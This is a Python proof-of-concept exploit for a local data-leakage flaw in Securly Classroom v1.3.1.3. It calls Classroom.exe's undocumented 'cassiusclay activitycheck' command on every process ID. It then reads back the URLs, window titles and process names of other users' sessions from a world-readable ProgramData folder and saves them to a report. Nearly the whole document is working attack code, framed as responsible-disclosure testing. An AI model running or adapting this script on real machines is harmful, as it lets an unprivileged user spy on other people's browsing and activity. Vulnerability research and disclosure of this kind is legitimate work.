"""
Securly Classroom v1.3.1.3 - Activity Monitoring Data Leakage PoC

Demonstrates that any standard user on a machine running Securly Classroom
can enumerate all running processes and extract URLs, window titles, and
application data for every session on the machine — including other users.

This works because:
1. Classroom.exe exposes a (presumably) testing entrypoint via the "cassiusclay" argument
   that is present in the production build of Classroom.
2. The activitycheck command accepts any PID and writes process data
   (URL, window title, process name) to a world-readable directory.
3. No privilege or session validation is performed.

Usage:
    python securly_activity_poc.py [--classroom-path PATH] [--output-dir DIR]

Requirements:
    - Python 3.x
    - psutil: pip install psutil
    - Securly Classroom installed and running
    - Run as standard user (the intention here is to see what's possible as a regular user)

(C) simplyKatt 2026

"""

import subprocess
import os
import json
import time
import argparse
import sys
import uuid
from pathlib import Path

try:
    import psutil
except ImportError:
    print("[!] psutil not found. Install with: pip install psutil")
    sys.exit(1)


# Default path to Classroom.exe - adjust if installed elsewhere
DEFAULT_CLASSROOM_PATH = r"C:\Program Files\Securly\Classroom\Classroom.exe"

# Directory where activitycheck writes its output
SECURLY_OUTPUT_DIR = r"C:\ProgramData\securly"

# How long to wait for Classroom.exe subprocess to write its output file
SUBPROCESS_TIMEOUT_SECONDS = 5

# PIDs to skip (system processes that will never yield useful data)
SKIP_PIDS = {0, 4}


def check_prerequisites(classroom_path: str) -> bool:
    if not os.path.exists(classroom_path):
        print(f"[!] Classroom.exe not found at: {classroom_path}")
        print("    Use --classroom-path to specify the correct location.")
        return False

    if not os.path.exists(SECURLY_OUTPUT_DIR):
        print(f"[!] Securly output directory not found: {SECURLY_OUTPUT_DIR}")
        print("    Is Securly Classroom installed and running?")
        return False

    return True


def get_all_pids() -> list[int]:
    pids = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            pid = proc.info['pid']
            if pid not in SKIP_PIDS:
                pids.append(pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return sorted(pids)


def query_pid_activity(classroom_path: str, pid: int) -> dict | None:
    """
    Invokes Classroom.exe with the cassiusclay activitycheck command for a
    given PID. Classroom.exe writes a JSON result to a file in ProgramData,
    which we then read back.

    This is the core of the vulnerability: any PID on the system can be
    queried, including processes belonging to other logged-in users.
    """
    # Use a unique filename to avoid collisions if running concurrently
    output_filename = f"poc_{pid}_{uuid.uuid4().hex[:8]}.json"
    output_path = os.path.join(SECURLY_OUTPUT_DIR, output_filename)

    cmd = [
        classroom_path,
        "cassiusclay",
        f"activitycheck:{pid}:{output_filename}"
    ]

    try:
        subprocess.run(
            cmd,
            timeout=SUBPROCESS_TIMEOUT_SECONDS,
            capture_output=True
        )
    except subprocess.TimeoutExpired:
        pass
    except FileNotFoundError:
        return None
    except Exception as e:
        return None

    # Give the subprocess a moment to flush and exit
    time.sleep(0.3)

    if not os.path.exists(output_path):
        return None

    try:
        with open(output_path, 'r', encoding='utf-8', errors='replace') as f:
            raw = f.read().strip()

        # Clean up the temp file
        try:
            os.remove(output_path)
        except Exception:
            pass

        if not raw or raw == '{"found": false}':
            return None

        # The output is not always valid JSON due to missing quotes around
        # values (another bug in activitycheck). Attempt parse, fall back
        # to raw string capture.
        try:
            data = json.loads(raw)
            data['_raw'] = raw
            data['_pid'] = pid
            return data
        except json.JSONDecodeError:
            # Return raw string — still demonstrates data leakage
            return {'_raw': raw, '_pid': pid, '_parse_error': True}

    except Exception as e:
        return None


def enumerate_all_activity(classroom_path: str, output_dir: str) -> list[dict]:
    pids = get_all_pids()
    print(f"[*] Found {len(pids)} PIDs to enumerate")
    print(f"[*] This demonstrates that a standard user can query any process")
    print(f"[*] including those belonging to other users on this machine\n")

    results = []
    interesting = []

    for i, pid in enumerate(pids):
        print(f"[*] Querying PID {pid} ({i+1}/{len(pids)})...", end='\r')
        result = query_pid_activity(classroom_path, pid)

        if result is None:
            continue

        results.append(result)

        # Flag results that contain URLs (browser activity — highest privacy impact)
        raw = result.get('_raw', '')
        if 'http' in raw.lower() and 'non-browser' not in raw.lower():
            interesting.append(result)
            proc_name = result.get('name', 'unknown')
            url = result.get('url', raw)
            print(f"\n[!] BROWSER ACTIVITY FOUND - PID {pid}")
            print(f"    Process : {proc_name}")
            print(f"    URL     : {url}")
            print(f"    Raw     : {raw[:200]}")

    print(f"\n\n[*] Enumeration complete")
    print(f"    Total PIDs queried    : {len(pids)}")
    print(f"    Processes with data   : {len(results)}")
    print(f"    Browser sessions found: {len(interesting)}")

    return results


def save_results(results: list[dict], output_dir: str) -> str:
    os.makedirs(output_dir, exist_ok=True)
    output_file = os.path.join(output_dir, f"securly_leak_{int(time.time())}.json")

    report = {
        "vulnerability": "Securly Classroom activitycheck PID enumeration",
        "version": "1.3.1.3",
        "entrypoint": "cassiusclay",
        "command": "activitycheck",
        "description": (
            "Standard user can enumerate all process activity on the machine "
            "including processes belonging to other logged-in users. "
            "Data includes URLs, window titles, process names, and internal "
            "app identifiers."
        ),
        "results_count": len(results),
        "results": results
    }

    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, default=str)

    return output_file


def main():
    parser = argparse.ArgumentParser(
        description="Securly Classroom activitycheck data leakage PoC"
    )
    parser.add_argument(
        '--classroom-path',
        default=DEFAULT_CLASSROOM_PATH,
        help=f"Path to Classroom.exe (default: {DEFAULT_CLASSROOM_PATH})"
    )
    parser.add_argument(
        '--output-dir',
        default=os.path.join(os.path.expanduser('~'), 'securly_poc_output'),
        help="Directory to save results JSON"
    )
    parser.add_argument(
        '--pid',
        type=int,
        help="Query a single specific PID instead of enumerating all"
    )

    args = parser.parse_args()

    print("=" * 60)
    print("Securly Classroom - activitycheck Data Leakage PoC")
    print("For responsible disclosure testing on isolated machines only")
    print("=" * 60 + "\n")

    if not check_prerequisites(args.classroom_path):
        sys.exit(1)

    if args.pid:
        print(f"[*] Querying single PID: {args.pid}")
        result = query_pid_activity(args.classroom_path, args.pid)
        if result:
            print(f"[+] Data returned for PID {args.pid}:")
            print(json.dumps(result, indent=2, default=str))
        else:
            print(f"[-] No data returned for PID {args.pid}")
        return

    results = enumerate_all_activity(args.classroom_path, args.output_dir)

    if results:
        output_file = save_results(results, args.output_dir)
        print(f"\n[+] Results saved to: {output_file}")
        print(f"[+] This file demonstrates the scope of data leakage")
        print(f"    and can be attached to a responsible disclosure report")
    else:
        print("\n[-] No activity data retrieved. Is Classroom.exe accessible?")


if __name__ == '__main__':
    main()
